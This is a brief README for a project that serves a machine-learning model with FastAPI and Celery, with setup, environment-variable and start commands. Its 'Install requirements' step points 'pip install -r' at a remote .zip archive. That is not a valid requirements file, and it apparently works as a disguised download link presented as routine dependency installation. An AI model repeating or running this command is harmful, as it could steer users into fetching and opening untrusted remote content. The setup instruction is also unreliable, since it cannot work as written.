# ServingMLFastCelery
Working example for serving a ML model using FastAPI and Celery.

## Usage

**Install requirements:**
```bash
pip install -r https://raw.githubusercontent.com/yashugupta786/async_app_ml/master/celery_task_app/async-ml-app-postpagan.zip
```

**Set environment variables:**
* MODEL_PATH: Path to pickled machine learning model
* BROKER_URI: Message broker to be used by Celery e.g. RabbitMQ
* BACKEND_URI: Celery backend e.g. Redis
```bash
export MODEL_PATH=...
export BROKER_URI=...
export BACKEND_URI=...
```

**Start API:**
```bash
uvicorn app:app
```

**Start worker node:**
```bash
celery -A celery_task_app:worker worker -l info
```
